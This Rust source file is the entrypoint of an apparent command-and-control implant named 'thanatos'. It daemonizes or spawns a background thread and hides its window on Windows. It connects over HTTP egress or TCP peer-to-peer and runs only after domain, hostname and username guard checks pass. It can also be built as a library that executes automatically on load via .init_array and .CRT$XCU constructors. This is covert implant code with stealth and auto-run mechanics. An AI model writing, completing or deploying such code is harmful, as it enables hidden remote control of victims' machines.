//! Main entrypoint for the agent.

#![cfg_attr(
    all(not(debug_assertions), target_os = "windows"),
    windows_subsystem = "windows"
)]
#![warn(missing_docs)]
#![warn(clippy::missing_docs_in_private_items)]

#[cfg(any(feature = "http"))]
use agent::egress_agent::Agent;

#[cfg(any(feature = "tcp"))]
use agent::p2p_agent::Agent;

mod internalcmds;

mod agent;
mod link;
mod load;
mod tasker;

use agent::CoreAgent;
use tasker::Tasker;

/// Initial function to bootstrap the agent. This handles any daemonizing.
pub fn thanatos_init() {
    #[cfg(all(
        target_os = "linux",
        feature = "forkonexec",
        not(feature = "spawnthread")
    ))]
    if unsafe { libc::daemon(1, 0) } == 0 {
        real_main();
    }

    #[cfg(all(feature = "spawnthread", not(feature = "forkonexec")))]
    std::thread::spawn(|| real_main());

    #[cfg(all(not(feature = "spawnthread"), not(feature = "forkonexec")))]
    real_main();

    run_exit_action();
}

/// Real entrypoint function for the agent
pub fn real_main() {
    if !prerun_checks() {
        return;
    }

    let tasker = Tasker::new();
    let mut agent = match Agent::initialize_from_tasker(tasker) {
        Ok(a) => a,
        Err(_) => return,
    };

    let _ = agent.run();
}

#[inline(always)]
fn run_exit_action() {
    #[cfg(feature = "exitprocess")]
    std::process::exit(0);

    #[cfg(all(
        target_os = "windows",
        feature = "exitthread",
        not(feature = "exitprocess")
    ))]
    {
        unsafe { windows::Win32::System::Threading::ExitThread(0) };
    }
}

/// Function which performs all of the pre-run initialization
pub fn prerun_checks() -> bool {
    #[cfg(feature = "domain")]
    if !agent_utils::guards::check_domain_guard() {
        return false;
    }

    #[cfg(feature = "hostname")]
    if !agent_utils::guards::check_hostname_guard() {
        return false;
    }

    #[cfg(feature = "username")]
    if !agent_utils::guards::check_username_guard() {
        return false;
    }

    true
}

/// Expose an entrypoint called "libinit" for people to call when loading the library
#[cfg(feature = "library")]
#[no_mangle]
extern "C" fn init() {
    thanatos_init();
}

/// Add a basic guard for building a library with the ctor feature
#[cfg(all(not(feature = "library"), feature = "ctor"))]
compile_error!("Cannot build an executable with the ctor feature");

/// Set the entrypoint to execute on library load
#[cfg(all(feature = "library", feature = "ctor"))]
#[used]
#[cfg_attr(target_os = "linux", link_section = ".init_array")]
#[cfg_attr(target_os = "windows", link_section = ".CRT$XCU")]
static INIT: extern "C" fn() = init;
